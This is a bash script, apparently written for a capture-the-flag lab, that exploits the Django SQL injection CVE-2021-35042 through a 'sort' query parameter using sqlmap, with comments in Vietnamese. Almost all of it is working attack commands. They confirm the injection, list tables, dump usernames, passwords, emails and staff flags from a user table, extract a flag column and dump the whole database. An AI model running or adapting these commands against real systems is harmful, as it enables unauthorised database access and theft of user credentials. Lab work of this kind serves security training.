#!/usr/bin/env bash
# ============================================================
# CVE-2021-35042 — sqlmap exploitation guide
# Injection: GET /posts/?sort=blog_post.id+PAYLOAD
# Technique: Error-based (extractvalue via Django sql_error)
# ============================================================

TARGET="http://localhost:8000/posts/"

# ── sqlmap cần biết: ────────────────────────────────────────
#  -p sort              : parameter cần inject
#  --prefix             : phần trước payload (tạo dot-path cho Django compiler)
#  --suffix             : phần sau payload (để trống)
#  --technique=E        : Error-based only (nhanh nhất với setup này)
#  --dbms=mysql         : chỉ định DBMS
#  --string             : chuỗi xác nhận page "bình thường" (không có error)
#  --no-cast            : tránh sqlmap wrap thêm CAST() làm hỏng payload
#  --level=1 --risk=1   : đủ cho error-based, không cần brute force

# ── 1. Xác nhận SQLi + lấy thông tin DB ────────────────────
echo "=== STEP 1: Detect & DB info ==="
sqlmap -u "${TARGET}?sort=blog_post.id%2B1" \
  -p sort \
  --prefix="blog_post.id+" \
  --suffix="" \
  --technique=E \
  --dbms=mysql \
  --no-cast \
  --level=1 --risk=1 \
  --banner --current-db --current-user \
  --batch

# ── 2. Liệt kê tất cả tables ────────────────────────────────
echo "=== STEP 2: List tables ==="
sqlmap -u "${TARGET}?sort=blog_post.id%2B1" \
  -p sort \
  --prefix="blog_post.id+" \
  --suffix="" \
  --technique=E \
  --dbms=mysql \
  --no-cast \
  --batch \
  -D ctf_blog --tables

# ── 3. Dump bảng users ──────────────────────────────────────
echo "=== STEP 3: Dump blog_user ==="
sqlmap -u "${TARGET}?sort=blog_post.id%2B1" \
  -p sort \
  --prefix="blog_post.id+" \
  --suffix="" \
  --technique=E \
  --dbms=mysql \
  --no-cast \
  --batch \
  -D ctf_blog -T blog_user \
  -C username,password,email,is_staff \
  --dump

# ── 4. Dump secret_flag từ blog_post ────────────────────────
echo "=== STEP 4: Dump secret_flag ==="
sqlmap -u "${TARGET}?sort=blog_post.id%2B1" \
  -p sort \
  --prefix="blog_post.id+" \
  --suffix="" \
  --technique=E \
  --dbms=mysql \
  --no-cast \
  --batch \
  -D ctf_blog -T blog_post \
  -C id,title,secret_flag,status \
  --dump

# ── 5. Dump toàn bộ database ────────────────────────────────
echo "=== STEP 5: Full dump ==="
sqlmap -u "${TARGET}?sort=blog_post.id%2B1" \
  -p sort \
  --prefix="blog_post.id+" \
  --suffix="" \
  --technique=E \
  --dbms=mysql \
  --no-cast \
  --batch \
  -D ctf_blog --dump-all \
  --output-dir=/tmp/sqlmap_ctf_dump
